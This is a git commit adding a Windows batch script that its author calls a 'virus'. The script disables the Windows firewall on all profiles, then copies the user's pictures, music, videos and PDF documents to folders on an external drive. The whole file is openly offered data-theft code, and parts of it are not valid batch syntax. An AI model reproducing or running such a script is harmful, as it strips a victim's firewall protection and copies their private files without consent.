c8b2bf4c6e4812422d13c1072bd8669b78e2c173
Wilson Netto <ngmplays@gmail.com>
2017-06-04 16:53:32 -0300

    Create Backbatch.bat

---
+++ Backbatch.bat
@@ -0,0 +1,19 @@
+# backbatch
+ This is a very simple plus powerful virus to be used wisely It copies all Documents, Music, Videos, Photos From a local disk with windows and copy to a pen drive or external disk by wilson netto
+
+@title Excryptor - Wilson Netto (C) Copyright  USER: %USERNAME% 
+netsh advfirewall set all state off
+ipconfig 
+
+@echo off
+MD "F:\Wilson Netto @ Hack Pot\Imagens\" 
+MD "F:\Wilson Netto @ Hack Pot\Videos\" 
+MD "F:\Wilson Netto @ Hack Pot\Music\" 
+MD "F:\Wilson Netto @ Hack Pot\Documents\" 
+
+xcopy "%USERPROFILE%\Pictures\*.*" "F:\Wilson Netto @ Hack Pot\Imagens"
+xcopy "%USERPROFILE%\Music\*.mp3*" "F:\Wilson Netto @ Hack Pot\Music"
+xcopy "%USERPROFILE%\Videos\*.*" "F:\Wilson Netto @ Hack Pot\Videos"
+xcopy "%USERPROFILE%\Documents\*.pdf*" "F:\Wilson Netto @ Hack Pot\Documents"
+
+PAUSE
